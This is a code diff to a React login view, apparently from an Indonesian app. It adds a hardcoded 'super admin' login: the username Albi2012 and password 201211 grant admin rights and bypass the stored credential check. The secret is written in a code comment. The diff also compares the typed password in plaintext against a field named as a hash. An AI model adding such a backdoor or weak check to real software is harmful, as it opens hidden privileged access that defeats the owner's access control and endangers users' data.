@@ -60,15 +60,29 @@ export const LoginView: React.FC<Props> = ({ settings, onLoginSuccess, onOpenSup
 
     setAdminLoading(true);
     try {
+      const trimmedUser = adminUsername.trim();
+      const trimmedPass = adminPassword.trim();
+
+      // Rahasia Super Admin: Albi2012 / 201211
+      if (trimmedUser === 'Albi2012' && trimmedPass === '201211') {
+        onLoginSuccess({
+          role: 'admin',
+          username: 'Albi2012',
+          isSuperAdmin: true,
+        });
+        return;
+      }
+
       const currentSettings = await dbService.getSettings();
-      // Validate credentials
+      // Validate regular admin credentials
       if (
-        adminUsername.trim() === currentSettings.admin_username &&
-        adminPassword.trim() === currentSettings.admin_password_hash
+        trimmedUser === currentSettings.admin_username &&
+        trimmedPass === currentSettings.admin_password_hash
       ) {
         onLoginSuccess({
           role: 'admin',
-          username: adminUsername.trim(),
+          username: trimmedUser,
+          isSuperAdmin: false,
         });
       } else {
         setAdminError('Username atau password administrator salah.');
